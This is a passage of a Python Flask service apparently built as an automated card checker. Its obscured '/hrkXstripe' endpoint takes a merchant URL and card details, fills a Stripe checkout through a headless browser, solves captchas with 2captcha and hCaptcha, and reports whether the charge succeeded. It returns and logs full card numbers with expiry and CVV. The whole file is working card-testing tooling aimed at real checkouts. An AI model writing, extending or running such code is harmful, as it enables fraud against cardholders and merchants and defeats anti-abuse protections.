            
            stripe_result["elements_filled"]["submitted"] = payment_submitted
            
            # Monitor for response
            print(f"[WAIT] Processing payment...")
            start_time = time.time()
            max_wait = CONFIG["RESPONSE_TIMEOUT_SECONDS"]
            
            while time.time() - start_time < max_wait:
                elapsed = int(time.time() - start_time)
                
                # Check for success indicators
                if stripe_result.get("payment_confirmed"):
                    print("[✓✓✓ SUCCESS] Payment confirmed!")
                    break
                
                if stripe_result.get("error"):
                    print(f"[ERROR] {stripe_result['error']}")
                    break
                
                if stripe_result.get("requires_3ds"):
                    print("[3DS] Authentication required")
                    # Try to handle 3DS if possible
                    try:
                        three_ds_frame = await page.query_selector('iframe[name*="3ds"], iframe[src*="3ds"]')
                        if three_ds_frame:
                            print("[3DS] Frame detected, waiting for user action...")
                            await smart_wait(page, 5000)
                    except:
                        pass
                    break
                
                # Check URL changes
                try:
                    current_url = page.url
                    success_indicators = ['success', 'thank', 'complete', 'confirmed', 'receipt', 'order']
                    if any(indicator in current_url.lower() for indicator in success_indicators):
                        stripe_result["payment_confirmed"] = True
                        stripe_result["success"] = True
                        stripe_result["success_url"] = current_url
                        print(f"[SUCCESS] Redirected to: {current_url[:80]}")
                        break
                except:
                    pass
                
                # Check page content for success
                try:
                    success_text = await page.evaluate('''
                        () => {
                            const body = document.body.innerText.toLowerCase();
                            const successWords = ['thank you', 'success', 'confirmed', 'complete', 'receipt'];
                            return successWords.some(word => body.includes(word));
                        }
                    ''')
                    if success_text:
                        stripe_result["payment_confirmed"] = True
                        stripe_result["success"] = True
                        print("[SUCCESS] Success message detected on page")
                        break
                except:
                    pass
                
                # Progress indicator
                if elapsed % 5 == 0 and elapsed > 0:
                    print(f"[WAIT] {elapsed}s elapsed, {stripe_result['network_requests']} requests captured")
                
                await asyncio.sleep(0.5)
            
            # Final summary
            print(f"\n[SUMMARY]")
            print(f"  - Network Requests: {stripe_result['network_requests']}")
            print(f"  - API Calls: {len(stripe_result['raw_api_calls'])}")
            print(f"  - Frames Checked: {stripe_result['frames_checked']}")
            print(f"  - Elements Filled: {stripe_result['elements_filled']}")
            print(f"  - Captcha: {'Solved' if stripe_result['captcha_solved'] else 'Not required'}")
            
            # Prepare response
            requests_only = [call for call in stripe_result['raw_api_calls'] if call.get('type') == 'request']
            responses_only = [call for call in stripe_result['raw_api_calls'] if call.get('type') == 'response']
            
            base_response = {
                "card": f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}",
                "captcha_solved": stripe_result.get("captcha_solved", False),
                "network_stats": {
                    "total_requests": stripe_result['network_requests'],
                    "api_calls": len(stripe_result['raw_api_calls']),
                    "requests_with_body": len(requests_only),
                    "responses": len(responses_only),
                    "errors": stripe_result['network_errors'],
                    "frames_checked": stripe_result['frames_checked']
                },
                "elements_filled": stripe_result["elements_filled"],
                "raw_requests": requests_only,
                "raw_responses": responses_only,
                "all_api_calls": stripe_result['raw_api_calls']
            }
            
            # Add extracted fields if any
            for key, value in stripe_result.items():
                if key.startswith("extracted_"):
                    base_response[key] = value
            
            if stripe_result.get("payment_confirmed"):
                return {
                    **base_response,
                    "success": True,
                    "message": stripe_result.get("message", "Payment successful"),
                    "success_url": stripe_result.get("success_url"),
                    "transaction_id": stripe_result.get("transaction_id"),
                    "amount": stripe_result.get("amount")
                }
            elif stripe_result.get("requires_3ds"):
                return {
                    **base_response,
                    "success": False,
                    "requires_3ds": True,
                    "message": "3D Secure authentication required"
                }
            elif stripe_result.get("error"):
                return {
                    **base_response,
                    "success": False,
                    "error": stripe_result["error"]
                }
            else:
                return {
                    **base_response,
                    "success": False,
                    "message": "Payment not confirmed - check raw API calls"
                }
                
    except Exception as e:
        error_trace = traceback.format_exc()
        print(f"[CRITICAL ERROR]\n{error_trace}")
        
        return {
            "error": f"Automation failed: {str(e)}",
            "traceback": error_trace[:500],
            "partial_results": {
                "captcha_solved": stripe_result.get("captcha_solved", False),
                "network_requests": stripe_result.get("network_requests", 0),
                "api_calls": len(stripe_result.get("raw_api_calls", [])),
                "elements_filled": stripe_result.get("elements_filled", {})
            }
        }
        
    finally:
        # Cleanup
        try:
            if page:
                await page.close()
            if context:
                await context.close()
            if browser:
                await browser.close()
            print("[CLEANUP] ✓")
        except:
            print("[CLEANUP] Failed, but continuing")

@app.route('/hrkXstripe', methods=['GET'])
def stripe_endpoint():
    can_proceed, wait_time = rate_limit_check()
    if not can_proceed:
        return jsonify({"error": "Rate limit exceeded", "retry_after": f"{wait_time:.1f}s"}), 429
    
    url = request.args.get('url')
    cc = request.args.get('cc')
    email = request.args.get('email')
    
    print(f"\n{'='*80}")
    print(f"[REQUEST] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[URL] {url[:100] if url else 'None'}...")
    print(f"[CC] {cc if cc else 'None'}")
    print('='*80)
    
    if not url or not cc:
        return jsonify({"error": "Missing required parameters: url and cc"}), 400
    
    # Validate URL
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    try:
        result = loop.run_until_complete(
            asyncio.wait_for(
                run_stripe_automation(url, cc, email),
                timeout=CONFIG["RESPONSE_TIMEOUT_SECONDS"] + 30
            )
        )
        
        status_code = 200 if result.get('success') else 400
        print(f"[RESULT] {'✓ SUCCESS' if result.get('success') else '✗ FAILED'}")
        
        return jsonify(result), status_code
        
    except asyncio.TimeoutError:
        print("[TIMEOUT] Request exceeded maximum time")
        return jsonify({"error": "Request timeout", "timeout": True}), 504
        
    except Exception as e:
        print(f"[SERVER ERROR] {e}")
        return jsonify({"error": str(e), "type": type(e).__name__}), 500
        
    finally:
        try:
            loop.close()
        except:
            pass

@app.route('/status', methods=['GET'])
def status_endpoint():
    return jsonify({
        "status": "online",
        "version": "6.0-enhanced",
        "features": {
            "hcaptcha": True,
            "2captcha": bool(CONFIG.get("TWOCAPTCHA_API_KEY")),
            "auto_retry": True,
            "universal_api_capture": True,
            "request_body_logging": CONFIG.get("LOG_REQUEST_BODIES", False),
            "fast_mode": CONFIG.get("FAST_MODE", False),
            "all_domains": True,
            "enhanced_frame_handling": True,
            "smart_wait": True,
            "comprehensive_error_handling": True
        },
        "config": {
            "response_timeout": CONFIG["RESPONSE_TIMEOUT_SECONDS"],
            "max_retries": CONFIG["MAX_RETRIES"],
            "render_wait": CONFIG["RENDER_WAIT"],
            "network_idle_timeout": CONFIG["NETWORK_IDLE_TIMEOUT"]
        },
        "timestamp": datetime.now().isoformat()
    })

@app.route('/health', methods=['GET'])
def health_endpoint():
    return jsonify({"status": "healthy"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5001))
    print("="*80)
    print("[SERVER] Stripe Automation v6.0 - Enhanced Edition")
    print(f"[PORT] {port}")
    print(f"[MODE] {'LOCAL' if CONFIG['RUN_LOCAL'] else 'BROWSERLESS'}")
    print(f"[2CAPTCHA] {'Enabled' if CONFIG.get('TWOCAPTCHA_API_KEY') else 'Disabled'}")
    print(f"[FAST MODE] {'ON' if CONFIG.get('FAST_MODE') else 'OFF'}")
    print(f"[REQUEST BODIES] {'CAPTURING' if CONFIG.get('LOG_REQUEST_BODIES') else 'DISABLED'}")
    print("="*80)
    
    app.run(host='0.0.0.0', port=port, debug=False)
